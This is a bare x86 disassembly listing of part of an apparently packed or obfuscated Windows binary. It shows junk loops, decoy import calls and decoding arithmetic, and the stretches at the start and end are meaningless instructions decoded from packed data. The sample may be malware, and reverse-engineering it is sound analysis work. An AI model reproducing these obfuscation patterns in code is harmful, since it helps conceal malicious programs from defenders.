  411b1c:	sbb    dh,BYTE PTR [ebp-0x1f487b69]
  411b22:	ja     0x411b2e
  411b24:	mov    esp,0xabcd65f4
  411b29:	mov    esp,0x6edf1aea
  411b2e:	push   ds
  411b2f:	and    eax,esp
  411b31:	add    dh,BYTE PTR gs:[ebx+0x18b8503f]
  411b38:	cmp    cl,BYTE PTR [esi]
  411b3a:	daa    
  411b3b:	pop    eax
  411b3c:	dec    esp
  411b3d:	outs   dx,DWORD PTR ds:[esi]
  411b3e:	inc    edi
  411b3f:	lds    edx,FWORD PTR [esi+ebp*2]
  411b42:	inc    ebx
  411b43:	inc    eax
  411b44:	mov    esp,0x5fc6e2d7
  411b49:	mov    ah,0xfd
  411b4b:	lock (bad) 
  411b4d:	sub    ch,BYTE PTR [ecx+0x78]
  411b50:	fsubr  QWORD PTR [ecx]
  411b52:	adc    esi,esp
  411b54:	(bad)  
  411b56:	inc    edi
  411b57:	lods   al,BYTE PTR ds:[esi]
  411b58:	test   esi,edx
  411b5a:	call   DWORD PTR [edx-0x68ebb60c]
  411b60:	pop    esi
  411b61:	jmp    0xa3b8:0xbf3b8ef
  411b68:	xabort 0x6
  411b6b:	ret    0xf6d5
  411b6e:	push   es
  411b6f:	sti    
  411b70:	lahf   
  411b71:	mov    ebx,0x98fefdca
  411b76:	(bad)  
  411b77:	test   bh,0xcc
  411b7a:	cmp    BYTE PTR gs:[ecx-0x5074098],bl
  411b81:	nop
  411b82:	fisttp DWORD PTR [ecx-0x38]
  411b85:	push   esp
  411b86:	lahf   
  411b87:	cli    
  411b88:	push   ebp
  411b89:	mov    BYTE PTR cs:[edx+0x328942dd],al
  411b90:	ins    BYTE PTR es:[edi],dx
  411b91:	xlat   BYTE PTR ds:[ebx]
  411b92:	int3   
  411b93:	call   0x2db8e125
  411b98:	test   al,0x6d
  411b9a:	push   cs
  411b9b:	fbstp  TBYTE PTR [ebp-0x26]
  411b9e:	xchg   edi,eax
  411b9f:	jmp    DWORD PTR [ecx+0x49e39c87]
  411ba5:	inc    eax
  411ba6:	popf   
  411ba7:	ror    DWORD PTR [ebx+0x73eb063c],0x14
  411bae:	in     al,0x98
  411bb0:	popa   
  411bb1:	jg     0x411b3e
  411bb3:	aaa    
  411bb4:	mov    al,ds:0x1008df6a
  411bb9:	stc    
  411bba:	cs cli 
  411bbc:	loope  0x411be4
  411bbe:	xchg   edi,eax
  411bbf:	lea    esi,[eax+0x74]
  411bc2:	ja     0x411c1c
  411bc4:	into   
  411bc5:	and    BYTE PTR ds:0x52ec317d,0xf3
  411bcc:	adc    eax,0x6dd7d1d3
  411bd1:	sar    DWORD PTR [ecx-0x370935ce],1
  411bd7:	push   ebx
  411bd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bd9:	add    BYTE PTR [edx-0x38],al
  411bdc:	(bad)  
  411bde:	repnz add edi,DWORD PTR [eax+0x70ab32c8]
  411be5:	loopne 0x411bd7
  411be7:	xchg   edx,eax
  411be8:	cli    
  411be9:	test   eax,0x51bd2e7e
  411bee:	or     eax,0x8910758b
  411bf3:	inc    esi
  411bf4:	or     BYTE PTR [ebx+0x758b1845],cl
  411bfa:	adc    BYTE PTR [ecx+0x458b0c46],cl
  411c00:	sbb    al,0x8b
  411c02:	jne    0x411c14
  411c04:	mov    DWORD PTR [esi+0x10],eax
  411c07:	mov    eax,DWORD PTR [ebp+0x8]
  411c0a:	xor    eax,ecx
  411c0c:	add    eax,edx
  411c0e:	pop    esi
  411c0f:	leave  
  411c10:	ret    0x18
  411c13:	push   ebp
  411c14:	mov    ebp,esp
  411c16:	sub    esp,0x9c
  411c1c:	mov    ecx,DWORD PTR [ebp+0x8]
  411c1f:	sbb    DWORD PTR ds:0x426f29,edi
  411c25:	mov    eax,0x8a9d
  411c2a:	adc    DWORD PTR ds:0x426eb5,0x24b2
  411c34:	xor    ax,WORD PTR [ecx+0x20]
  411c38:	mov    DWORD PTR ds:0x426f0d,0x19
  411c42:	cmp    DWORD PTR ds:0x426f0d,0x0
  411c49:	je     0x411c79
  411c4f:	cmp    DWORD PTR ds:0x426f0d,0x23
  411c56:	jge    0x411c79
  411c5c:	jmp    0x411c67
  411c61:	call   DWORD PTR ds:0x430a00
  411c67:	mov    ecx,DWORD PTR ds:0x426f0d
  411c6d:	dec    ecx
  411c6e:	mov    DWORD PTR ds:0x426f0d,ecx
  411c74:	jmp    0x411c42
  411c79:	mov    ecx,0x3b5f
  411c7e:	add    ax,cx
  411c81:	mov    DWORD PTR ds:0x426e85,0x19
  411c8b:	cmp    DWORD PTR ds:0x426e85,0x0
  411c92:	je     0x411ce1
  411c98:	cmp    DWORD PTR ds:0x426e85,0xc
  411c9f:	jg     0x411ce1
  411ca5:	jmp    0x411cb3
  411caa:	push   DWORD PTR [ebp-0x10]
  411cad:	call   DWORD PTR ds:0x430a3c
  411cb3:	cmp    DWORD PTR ds:0x426e85,0xd
  411cba:	jne    0x411ccf
  411cc0:	xor    ecx,ecx
  411cc2:	or     ecx,DWORD PTR ds:0x426e85
  411cc8:	dec    ecx
  411cc9:	mov    DWORD PTR ds:0x426e85,ecx
  411ccf:	mov    ecx,DWORD PTR ds:0x426e85
  411cd5:	dec    ecx
  411cd6:	mov    DWORD PTR ds:0x426e85,ecx
  411cdc:	jmp    0x411c8b
  411ce1:	movzx  eax,ax
  411ce4:	mov    ecx,DWORD PTR ds:0x426f25
  411cea:	sub    DWORD PTR ds:0x426e89,ecx
  411cf0:	mov    DWORD PTR [ebp-0x10],eax
  411cf3:	mov    BYTE PTR [ebp-0x1],0x7a
  411cf7:	lea    eax,[ebp-0x1]
  411cfa:	mov    DWORD PTR [ebp-0xc],eax
  411cfd:	mov    al,BYTE PTR [ebp-0x1]
  411d00:	mov    ecx,DWORD PTR [ebp-0xc]
  411d03:	xor    al,0x81
  411d05:	sub    DWORD PTR ds:0x426f2d,0x318c
  411d0f:	add    al,0x6
  411d11:	sub    DWORD PTR ds:0x426ef5,0x54d2
  411d1b:	mov    BYTE PTR [ecx],al
  411d1d:	and    eax,eax
  411d1f:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411d26:	push   ebx
  411d27:	and    DWORD PTR ds:0x426e8d,0x0
  411d31:	mov    ecx,DWORD PTR ds:0x426e8d
  411d37:	inc    ecx
  411d38:	mov    DWORD PTR ds:0x426e8d,ecx
  411d3e:	cmp    DWORD PTR ds:0x426e8d,0x22
  411d45:	jg     0x411d8e
  411d4b:	jmp    0x411d81
  411d50:	push   0x70b5
  411d55:	push   0x7924
  411d5a:	push   0x4ec8
  411d5f:	push   0x56ca
  411d64:	push   0x88b0
  411d69:	push   0x70c2
  411d6e:	push   0x4f11
  411d73:	push   DWORD PTR [ebp-0x1c]
  411d76:	push   0x827e
  411d7b:	call   DWORD PTR ds:0x430a04
  411d81:	cmp    DWORD PTR ds:0x426e8d,0x18
  411d88:	jb     0x411d31
  411d8e:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  411d95:	and    DWORD PTR ds:0x426ee1,0x0
  411d9f:	jmp    0x411daf
  411da4:	mov    eax,ds:0x426ee1
  411da9:	inc    eax
  411daa:	mov    ds:0x426ee1,eax
  411daf:	cmp    DWORD PTR ds:0x426ee1,0x10
  411db6:	jae    0x411e0b
  411dbc:	cmp    DWORD PTR ds:0x426ee1,0x6
  411dc3:	jb     0x411e0b
  411dc9:	jmp    0x411dee
  411dce:	push   0x426ebd
  411dd3:	push   0x863e
  411dd8:	push   DWORD PTR [ebp-0x14]
  411ddb:	push   DWORD PTR [ebp-0x28]
  411dde:	push   0x80d0
  411de3:	push   0x79b2
  411de8:	call   DWORD PTR ds:0x430a40
  411dee:	cmp    DWORD PTR ds:0x426ee1,0x5
  411df5:	jne    0x411e06
  411dfb:	mov    eax,ds:0x426ee1
  411e00:	inc    eax
  411e01:	mov    ds:0x426ee1,eax
  411e06:	jmp    0x411da4
  411e0b:	mov    ecx,DWORD PTR [ebp-0x18]
  411e0e:	push   esi
  411e0f:	mov    eax,0x75108b3
  411e14:	xor    ecx,eax
  411e16:	mov    esi,0x3272fa
  411e1b:	push   edi
  411e1c:	add    ecx,esi
  411e1e:	jmp    0x411e3e
  411e23:	not    DWORD PTR ds:0x426ea5
  411e29:	mov    dl,BYTE PTR [ebp-0x1]
  411e2c:	mov    DWORD PTR ds:0x426f25,0x1eab
  411e36:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  411e3d:	inc    ecx
  411e3e:	mov    DWORD PTR ds:0x426ee1,0x6456
  411e48:	cmp    ecx,0x40
  411e4b:	mov    DWORD PTR ds:0x426ea9,0x5cb
  411e55:	jb     0x411e23
  411e5b:	sub    DWORD PTR ds:0x426ec5,0x4698
  411e65:	mov    edx,DWORD PTR [ebp-0x18]
  411e68:	xor    edx,eax
  411e6a:	add    edx,esi
  411e6c:	mov    DWORD PTR ds:0x426ea9,0x4896
  411e76:	jmp    0x411f44
  411e7b:	mov    edi,DWORD PTR [ebp+0x8]
  411e7e:	and    DWORD PTR ds:0x426e9d,0x0
  411e88:	jmp    0x411e9a
  411e8d:	mov    ecx,DWORD PTR ds:0x426e9d
  411e93:	inc    ecx
  411e94:	mov    DWORD PTR ds:0x426e9d,ecx
  411e9a:	cmp    DWORD PTR ds:0x426e9d,0x12
  411ea1:	jae    0x411ec4
  411ea7:	cmp    DWORD PTR ds:0x426e9d,0x1f
  411eae:	jg     0x411ec4
  411eb4:	jmp    0x411ebf
  411eb9:	call   DWORD PTR ds:0x430a08
  411ebf:	jmp    0x411e8d
  411ec4:	mov    ecx,0x8a9d
  411ec9:	add    DWORD PTR ds:0x426f1d,0x3bc7
  411ed3:	xor    cx,WORD PTR [edi+edx*4+0x2]
  411ed8:	mov    edi,0x3b5f
  411edd:	or     DWORD PTR ds:0x426ec9,0x426e8d
  411ee7:	add    cx,di
  411eea:	movzx  ecx,cx
  411eed:	mov    DWORD PTR [ebp-0xc],ecx
  411ef0:	mov    ecx,DWORD PTR ds:0x426ee9
  411ef6:	sub    ecx,DWORD PTR ds:0x426e99
  411efc:	mov    DWORD PTR ds:0x426ee9,ecx
  411f02:	mov    ecx,DWORD PTR [ebp+0x8]
  411f05:	or     DWORD PTR ds:0x426f2d,0x426e89
  411f0f:	movzx  ecx,WORD PTR [ecx+edx*4]
  411f13:	adc    DWORD PTR ds:0x426ebd,0x426ef1
  411f1d:	xor    ecx,0x8a9d
  411f23:	xor    DWORD PTR ds:0x426ef5,0x426e95
  411f2d:	add    ecx,edi
  411f2f:	mov    edi,DWORD PTR [ebp-0xc]
  411f32:	mov    DWORD PTR ds:0x426f09,0x3565
  411f3c:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  411f43:	inc    edx
  411f44:	mov    ecx,0x1c2a
  411f49:	mov    ecx,DWORD PTR [ebp-0x10]
  411f4c:	cmp    edx,ecx
  411f4e:	jne    0x411e7b
  411f54:	sub    edx,0x34ee
  411f5a:	mov    ecx,DWORD PTR [ebp-0x18]
  411f5d:	xor    DWORD PTR ds:0x426ef9,ecx
  411f63:	mov    edx,DWORD PTR [ebp+0x10]
  411f66:	mov    DWORD PTR ds:0x426ec5,0x17
  411f70:	cmp    DWORD PTR ds:0x426ec5,0x0
  411f77:	je     0x411fcf
  411f7d:	cmp    DWORD PTR ds:0x426ec5,0x2
  411f84:	jl     0x411fcf
  411f8a:	jmp    0x411f9f
  411f8f:	push   0x4ca2
  411f94:	push   0x426035
  411f99:	call   DWORD PTR ds:0x430a44
  411f9f:	cmp    DWORD PTR ds:0x426ec5,0x3
  411fa6:	jne    0x411fbb
  411fac:	xor    edi,edi
  411fae:	xor    edi,DWORD PTR ds:0x426ec5
  411fb4:	dec    edi
  411fb5:	mov    DWORD PTR ds:0x426ec5,edi
  411fbb:	xor    edi,edi
  411fbd:	add    edi,DWORD PTR ds:0x426ec5
  411fc3:	dec    edi
  411fc4:	mov    DWORD PTR ds:0x426ec5,edi
  411fca:	jmp    0x411f70
  411fcf:	xor    ecx,eax
  411fd1:	mov    DWORD PTR ds:0x426f21,0x1d
  411fdb:	cmp    DWORD PTR ds:0x426f21,0x0
  411fe2:	je     0x41201c
  411fe8:	cmp    DWORD PTR ds:0x426f21,0x2c
  411fef:	jg     0x41201c
  411ff5:	jmp    0x41200a
  411ffa:	push   0x426ed5
  411fff:	push   0x3809
  412004:	call   DWORD PTR ds:0x430a48
  41200a:	mov    edi,DWORD PTR ds:0x426f21
  412010:	dec    edi
  412011:	mov    DWORD PTR ds:0x426f21,edi
  412017:	jmp    0x411fdb
  41201c:	add    ecx,esi
  41201e:	xor    edi,DWORD PTR ds:0x426ea9
  412024:	mov    DWORD PTR [edx],ecx
  412026:	mov    ecx,DWORD PTR [ebp-0x18]
  412029:	xor    ecx,eax
  41202b:	add    ecx,esi
  41202d:	and    edi,0x6cf8
  412033:	mov    DWORD PTR [ebp-0xc],ecx
  412036:	mov    DWORD PTR ds:0x426ea5,0x13
  412040:	cmp    DWORD PTR ds:0x426ea5,0x0
  412047:	je     0x41207a
  41204d:	cmp    DWORD PTR ds:0x426ea5,0x1f
  412054:	jge    0x41207a
  41205a:	jmp    0x412068
  41205f:	push   DWORD PTR [ebp-0x24]
  412062:	call   DWORD PTR ds:0x430a0c
  412068:	mov    edi,DWORD PTR ds:0x426ea5
  41206e:	dec    edi
  41206f:	mov    DWORD PTR ds:0x426ea5,edi
  412075:	jmp    0x412040
  41207a:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  412081:	mov    DWORD PTR ds:0x426ea9,0x18
  41208b:	cmp    DWORD PTR ds:0x426ea9,0x0
  412092:	je     0x4120ec
  412098:	cmp    DWORD PTR ds:0x426ea9,0xa
  41209f:	ja     0x4120ec
  4120a5:	jmp    0x4120c0
  4120aa:	push   DWORD PTR [ebp-0x28]
  4120ad:	push   0x4ee1
  4120b2:	push   DWORD PTR [ebp-0x20]
  4120b5:	push   0x56ea
  4120ba:	call   DWORD PTR ds:0x430a4c
  4120c0:	cmp    DWORD PTR ds:0x426ea9,0xb
  4120c7:	jne    0x4120da
  4120cd:	mov    ecx,DWORD PTR ds:0x426ea9
  4120d3:	dec    ecx
  4120d4:	mov    DWORD PTR ds:0x426ea9,ecx
  4120da:	mov    ecx,DWORD PTR ds:0x426ea9
  4120e0:	dec    ecx
  4120e1:	mov    DWORD PTR ds:0x426ea9,ecx
  4120e7:	jmp    0x41208b
  4120ec:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  4120f3:	adc    edi,edi
  4120f5:	mov    DWORD PTR [ebp-0x10],0xf89c95b5
  4120fc:	mov    ecx,DWORD PTR ds:0x426f19
  412102:	adc    DWORD PTR ds:0x426eb9,ecx
  412108:	mov    ecx,DWORD PTR [ebp-0x14]
  41210b:	movzx  edi,BYTE PTR ds:0x426ef5
  412112:	add    edi,DWORD PTR ds:0x426ed5
  412118:	mov    DWORD PTR ds:0x426ef5,edi
  41211e:	mov    DWORD PTR [ebp+0x8],ecx
  412121:	mov    ecx,DWORD PTR [ebp+0x8]
  412124:	mov    DWORD PTR ds:0x426eb1,0x11
  41212e:	cmp    DWORD PTR ds:0x426eb1,0x0
  412135:	je     0x4121a1
  41213b:	cmp    DWORD PTR ds:0x426eb1,0x9
  412142:	jl     0x4121a1
  412148:	jmp    0x412175
  41214d:	push   DWORD PTR [ebp-0x24]
  412150:	push   0x5b11
  412155:	push   0x5886
  41215a:	push   DWORD PTR [ebp-0xc]
  41215d:	push   DWORD PTR [ebp-0x28]
  412160:	push   0x128a
  412165:	push   0x1ff9
  41216a:	push   0x6625
  41216f:	call   DWORD PTR ds:0x430a10
  412175:	cmp    DWORD PTR ds:0x426eb1,0xa
  41217c:	jne    0x41218f
  412182:	mov    edi,DWORD PTR ds:0x426eb1
  412188:	dec    edi
  412189:	mov    DWORD PTR ds:0x426eb1,edi
  41218f:	mov    edi,DWORD PTR ds:0x426eb1
  412195:	dec    edi
  412196:	mov    DWORD PTR ds:0x426eb1,edi
  41219c:	jmp    0x41212e
  4121a1:	xor    ecx,eax
  4121a3:	and    DWORD PTR ds:0x426ebd,0x0
  4121ad:	jmp    0x4121bf
  4121b2:	mov    edi,DWORD PTR ds:0x426ebd
  4121b8:	inc    edi
  4121b9:	mov    DWORD PTR ds:0x426ebd,edi
  4121bf:	cmp    DWORD PTR ds:0x426ebd,0x14
  4121c6:	jae    0x4121e9
  4121cc:	cmp    DWORD PTR ds:0x426ebd,0x1d
  4121d3:	jle    0x4121e9
  4121d9:	jmp    0x4121e4
  4121de:	call   DWORD PTR ds:0x430a14
  4121e4:	jmp    0x4121b2
  4121e9:	add    ecx,esi
  4121eb:	mov    edi,DWORD PTR ds:0x426ec9
  4121f1:	mov    ecx,0xf641bea
  4121f6:	mov    edi,0x5a1eade
  4121fb:	mov    DWORD PTR ds:0x426ed5,0x1d19
  412205:	je     0x416e72
  41220b:	and    DWORD PTR ds:0x426e95,0x0
  412215:	jmp    0x412229
  41221a:	xor    ebx,ebx
  41221c:	xor    ebx,DWORD PTR ds:0x426e95
  412222:	inc    ebx
  412223:	mov    DWORD PTR ds:0x426e95,ebx
  412229:	cmp    DWORD PTR ds:0x426e95,0x1f
  412230:	jae    0x41225c
  412236:	cmp    DWORD PTR ds:0x426e95,0x2f
  41223d:	jl     0x41225c
  412243:	jmp    0x412257
  412248:	push   DWORD PTR [ebp-0x18]
  41224b:	push   DWORD PTR [ebp-0x18]
  41224e:	push   DWORD PTR [ebp-0x10]
  412251:	call   DWORD PTR ds:0x430a18
  412257:	jmp    0x41221a
  41225c:	mov    edx,DWORD PTR [ebp+0x8]
  41225f:	mov    ebx,DWORD PTR ds:0x426ec5
  412265:	add    ebx,DWORD PTR ds:0x426ea1
  41226b:	mov    DWORD PTR ds:0x426ec5,ebx
  412271:	mov    ebx,DWORD PTR [ebp-0x8]
  412274:	xor    edx,eax
  412276:	sbb    DWORD PTR ds:0x426ea1,0x426edd
  412280:	xor    ebx,eax
  412282:	add    DWORD PTR ds:0x426e91,0x426ec5
  41228c:	sub    edx,ebx
  41228e:	sub    edx,esi
  412290:	sbb    DWORD PTR ds:0x426eb5,edi
  412296:	xor    edx,eax
  412298:	mov    DWORD PTR [ebp+0x8],edx
  41229b:	add    edx,0x4d69
  4122a1:	mov    edx,DWORD PTR [ebp+0x8]
  4122a4:	mov    ebx,DWORD PTR [ebp-0x58]
  4122a7:	lea    edx,[ebx+edx*1+0x5708f4]
  4122ae:	mov    DWORD PTR [ebp-0x58],edx
  4122b1:	mov    edx,DWORD PTR [ebp+0x8]
  4122b4:	xor    ebx,DWORD PTR ds:0x426f05
  4122ba:	mov    ebx,DWORD PTR [ebp-0x54]
  4122bd:	and    DWORD PTR ds:0x426f11,0x6a73
  4122c7:	add    edx,0x64f89a
  4122cd:	adc    DWORD PTR ds:0x426ea5,0x426ef1
  4122d7:	imul   edx,ebx
  4122da:	or     DWORD PTR ds:0x426eed,0x7801
  4122e4:	mov    DWORD PTR [ebp-0x54],edx
  4122e7:	and    DWORD PTR ds:0x426ea9,0x0
  4122f1:	mov    edx,DWORD PTR ds:0x426ea9
  4122f7:	inc    edx
  4122f8:	mov    DWORD PTR ds:0x426ea9,edx
  4122fe:	cmp    DWORD PTR ds:0x426ea9,0xa
  412305:	ja     0x41234d
  41230b:	jmp    0x412326
  412310:	push   DWORD PTR [ebp-0x18]
  412313:	push   0x70df
  412318:	push   DWORD PTR [ebp-0x28]
  41231b:	push   0x6818
  412320:	call   DWORD PTR ds:0x430a1c
  412326:	cmp    DWORD PTR ds:0x426ea9,0x9
  41232d:	jne    0x412340
  412333:	mov    edx,DWORD PTR ds:0x426ea9
  412339:	inc    edx
  41233a:	mov    DWORD PTR ds:0x426ea9,edx
  412340:	cmp    DWORD PTR ds:0x426ea9,0x1f
  412347:	jb     0x4122f1
  41234d:	mov    edx,DWORD PTR [ebp+0x8]
  412350:	movzx  ebx,WORD PTR ds:0x426ef1
  412357:	sub    DWORD PTR ds:0x426eb9,ebx
  41235d:	mov    ebx,DWORD PTR [ebp-0x50]
  412360:	add    edx,0x242ebe9
  412366:	sbb    DWORD PTR ds:0x426ef1,0x426ee1
  412370:	and    edx,ebx
  412372:	mov    DWORD PTR [ebp-0x50],edx
  412375:	xor    edx,edx
  412377:	or     edx,DWORD PTR ds:0x426ed1
  41237d:	adc    DWORD PTR ds:0x426ec5,edx
  412383:	mov    edx,DWORD PTR [ebp+0x8]
  412386:	and    DWORD PTR ds:0x426f09,0x423
  412390:	mov    ebx,DWORD PTR [ebp-0x4c]
  412393:	and    DWORD PTR ds:0x426ee1,0x67c7
  41239d:	add    edx,ecx
  41239f:	mov    DWORD PTR ds:0x426ee1,0x22dc
  4123a9:	or     edx,ebx
  4123ab:	and    DWORD PTR ds:0x426f2d,0x602a
  4123b5:	mov    DWORD PTR [ebp-0x4c],edx
  4123b8:	and    DWORD PTR ds:0x426e8d,edx
  4123be:	mov    edx,DWORD PTR [ebp+0x8]
  4123c1:	mov    DWORD PTR ds:0x426ee9,0x1e
  4123cb:	cmp    DWORD PTR ds:0x426ee9,0x0
  4123d2:	je     0x41241c
  4123d8:	cmp    DWORD PTR ds:0x426ee9,0xf
  4123df:	jl     0x41241c
  4123e5:	jmp    0x4123f0
  4123ea:	call   DWORD PTR ds:0x430a20
  4123f0:	cmp    DWORD PTR ds:0x426ee9,0x10
  4123f7:	jne    0x41240a
  4123fd:	mov    ebx,DWORD PTR ds:0x426ee9
  412403:	dec    ebx
  412404:	mov    DWORD PTR ds:0x426ee9,ebx
  41240a:	mov    ebx,DWORD PTR ds:0x426ee9
  412410:	dec    ebx
  412411:	mov    DWORD PTR ds:0x426ee9,ebx
  412417:	jmp    0x4123cb
  41241c:	mov    ebx,0xfdbe0321
  412421:	sub    ebx,edx
  412423:	sbb    edx,0x3018
  412429:	add    ebx,DWORD PTR [ebp-0x48]
  41242c:	sub    DWORD PTR ds:0x426e85,0x15fb
  412436:	mov    DWORD PTR [ebp-0x48],ebx
  412439:	mov    DWORD PTR ds:0x426f0d,0x10
  412443:	cmp    DWORD PTR ds:0x426f0d,0x0
  41244a:	je     0x4124a6
  412450:	cmp    DWORD PTR ds:0x426f0d,0x5
  412457:	jbe    0x4124a6
  41245d:	jmp    0x412478
  412462:	push   0x426000
  412467:	push   DWORD PTR [ebp-0x24]
  41246a:	push   DWORD PTR [ebp-0x14]
  41246d:	push   0x32fd
  412472:	call   DWORD PTR ds:0x430a24
  412478:	cmp    DWORD PTR ds:0x426f0d,0x6
  41247f:	jne    0x412494
  412485:	xor    ebx,ebx
  412487:	or     ebx,DWORD PTR ds:0x426f0d
  41248d:	dec    ebx
  41248e:	mov    DWORD PTR ds:0x426f0d,ebx
  412494:	mov    ebx,DWORD PTR ds:0x426f0d
  41249a:	dec    ebx
  41249b:	mov    DWORD PTR ds:0x426f0d,ebx
  4124a1:	jmp    0x412443
  4124a6:	mov    edx,DWORD PTR [ebp+0x8]
  4124a9:	mov    ebx,DWORD PTR [ebp-0x44]
  4124ac:	add    edx,edi
  4124ae:	add    DWORD PTR ds:0x426ee5,0x5ab2
  4124b8:	xor    edx,ebx
  4124ba:	xor    DWORD PTR ds:0x426ebd,0x426e81
  4124c4:	mov    DWORD PTR [ebp-0x44],edx
  4124c7:	and    DWORD PTR ds:0x426f05,0x0
  4124d1:	mov    edx,DWORD PTR ds:0x426f05
  4124d7:	inc    edx
  4124d8:	mov    DWORD PTR ds:0x426f05,edx
  4124de:	cmp    DWORD PTR ds:0x426f05,0x28
  4124e5:	jg     0x412506
  4124eb:	jmp    0x4124f9
  4124f0:	push   DWORD PTR [ebp-0x1c]
  4124f3:	call   DWORD PTR ds:0x430a28
  4124f9:	cmp    DWORD PTR ds:0x426f05,0x1d
  412500:	jb     0x4124d1
  412506:	mov    edx,DWORD PTR [ebp+0x8]
  412509:	xor    edx,eax
  41250b:	add    edx,esi
  41250d:	jne    0x41220b
  412513:	jmp    0x416e72
  412518:	mov    edx,DWORD PTR [ebp-0xc]
  41251b:	sub    edx,esi
  41251d:	xor    edx,eax
  41251f:	mov    DWORD PTR [ebp-0x5c],edx
  412522:	mov    edx,DWORD PTR [ebp-0x10]
  412525:	mov    ebx,DWORD PTR [ebp-0x8]
  412528:	xor    edx,eax
  41252a:	xor    ebx,eax
  41252c:	sub    edx,ebx
  41252e:	sub    edx,esi
  412530:	xor    edx,eax
  412532:	mov    DWORD PTR [ebp-0x10],edx
  412535:	mov    edx,DWORD PTR [ebp-0x14]
  412538:	mov    DWORD PTR [ebp+0x8],edx
  41253b:	jmp    0x4125b0
  412540:	mov    edx,DWORD PTR [ebp+0x8]
  412543:	mov    ebx,DWORD PTR [ebp-0x8]
  412546:	xor    edx,eax
  412548:	xor    ebx,eax
  41254a:	sub    edx,ebx
  41254c:	sub    edx,esi
  41254e:	xor    edx,eax
  412550:	mov    DWORD PTR [ebp+0x8],edx
  412553:	mov    edx,DWORD PTR [ebp+0x8]
  412556:	mov    ebx,DWORD PTR [ebp-0x58]
  412559:	lea    edx,[ebx+edx*1+0x5708f4]
  412560:	mov    DWORD PTR [ebp-0x58],edx
  412563:	mov    edx,DWORD PTR [ebp+0x8]
  412566:	mov    ebx,DWORD PTR [ebp-0x54]
  412569:	add    edx,0x64f89a
  41256f:	imul   edx,ebx
  412572:	mov    DWORD PTR [ebp-0x54],edx
  412575:	mov    edx,DWORD PTR [ebp+0x8]
  412578:	mov    ebx,DWORD PTR [ebp-0x50]
  41257b:	add    edx,0x242ebe9
  412581:	and    edx,ebx
  412583:	mov    DWORD PTR [ebp-0x50],edx
  412586:	mov    edx,DWORD PTR [ebp+0x8]
  412589:	mov    ebx,DWORD PTR [ebp-0x4c]
  41258c:	add    edx,ecx
  41258e:	or     edx,ebx
  412590:	mov    DWORD PTR [ebp-0x4c],edx
  412593:	mov    edx,DWORD PTR [ebp+0x8]
  412596:	mov    ebx,0xfdbe0321
  41259b:	sub    ebx,edx
  41259d:	add    ebx,DWORD PTR [ebp-0x48]
  4125a0:	mov    DWORD PTR [ebp-0x48],ebx
  4125a3:	mov    edx,DWORD PTR [ebp+0x8]
  4125a6:	mov    ebx,DWORD PTR [ebp-0x44]
  4125a9:	add    edx,edi
  4125ab:	xor    edx,ebx
  4125ad:	mov    DWORD PTR [ebp-0x44],edx
  4125b0:	mov    edx,DWORD PTR [ebp+0x8]
  4125b3:	xor    edx,eax
  4125b5:	add    edx,esi
  4125b7:	jne    0x412540
  4125bd:	jmp    0x414910
  4125c2:	push   esp
  4125c3:	pop    edi
  4125c4:	push   0x2e
  4125c6:	js     0x4125f6
  4125c8:	pop    eax
  4125c9:	imul   ebx,DWORD PTR [edx+0x12],0x85ea7a6a
  4125d0:	cmp    eax,DWORD PTR [ecx+0x18]
  4125d3:	jae    0x412650
  4125d5:	jnp    0x412588
  4125d7:	pushf  
  4125d8:	jnp    0x412655
  4125da:	dec    eax
  4125db:	mov    edx,0xcf2b5d8a
  4125e0:	push   ss
  4125e1:	in     eax,0xa1
  4125e3:	jbe    0x412574
  4125e5:	or     DWORD PTR [esi+0xea2a505],ebp
  4125eb:	push   ebx
  4125ec:	and    BYTE PTR [ecx+0x7],dl
  4125ef:	jp     0x4125ce
  4125f1:	pop    edi
  4125f2:	sub    ah,ch
  4125f4:	les    ecx,FWORD PTR [esp+ebx*4]
  4125f7:	or     eax,0xb7f429a3
  4125fc:	mov    eax,ds:0x9fb0ce2a
  412601:	imul   edi,DWORD PTR [edi+0x12],0xb
  412605:	sub    ebx,0x7b
  412608:	and    ebp,ebx
  41260a:	mov    ecx,0x1496007b
  41260f:	cmp    ecx,DWORD PTR [ebx]
  412611:	or     edx,edx
  412613:	cmp    al,0xd6
  412615:	aad    0x3c
  412617:	enter  0xac99,0x58
  41261b:	cld    
  41261c:	inc    ebx
  41261d:	pushf  
  41261e:	xor    bh,ah
  412620:	xchg   ebp,eax
  412621:	hlt    
  412622:	jno    0x412681
  412624:	js     0x41269c
  412626:	pop    ebp
  412627:	cli    
  412628:	cld    
  412629:	loopne 0x41264f
  41262b:	test   BYTE PTR [ebp-0x634e8854],ah
  412631:	(bad)  
  412632:	retf   
  412633:	add    DWORD PTR [ebx],esp
  412635:	stos   BYTE PTR es:[edi],al
  412636:	fcomp  QWORD PTR ds:0x2c90a4f3
  41263c:	xchg   ecx,eax
  41263d:	xor    edx,DWORD PTR [ebx]
  41263f:	inc    edi
  412640:	aam    0xf8
  412642:	pop    esi
  412643:	mov    ds:0x750f9b6a,eax
  412648:	div    esp
  41264a:	nop
  41264b:	enter  0xbc80,0x9f
  41264f:	dec    eax
  412650:	or     al,BYTE PTR [edx-0x4f]
  412653:	mov    DWORD PTR [edi],esi
  412655:	loop   0x412642
  412657:	hlt    
  412658:	enter  0x7c58,0xdb
  41265c:	lds    ebp,FWORD PTR [edx+0x30]
  41265f:	pmullw mm2,QWORD PTR ss:[edx]
  412663:	popf   
  412664:	push   ebx
  412665:	ins    DWORD PTR es:[edi],dx
  412666:	adc    al,0x5e
  412668:	pop    edi
  412669:	mov    ebp,0xc4f09e0e
  41266e:	loopne 0x412653
  412670:	xchg   ebp,eax
  412671:	or     ecx,DWORD PTR [edx]
  412673:	add    DWORD PTR [edx+0x14],0x66
  412677:	cli    
  412678:	stos   BYTE PTR es:[edi],al
  412679:	mov    esp,0xc7fa87c7
  41267e:	aaa    
  41267f:	mov    edi,0x4c017575
  412684:	jg     0x4126b8
  412686:	out    dx,eax
  412687:	push   ds
  412688:	arpl   WORD PTR ds:0x31587e78,ax
  41268e:	bound  edi,QWORD PTR [esi+edx*8+0x5d25d2de]
  412695:	xor    edi,eax
  412697:	cs ja  0x412625
  41269a:	dec    ebx
  41269b:	nop
  41269c:	add    al,0xe2
  41269e:	dec    edi
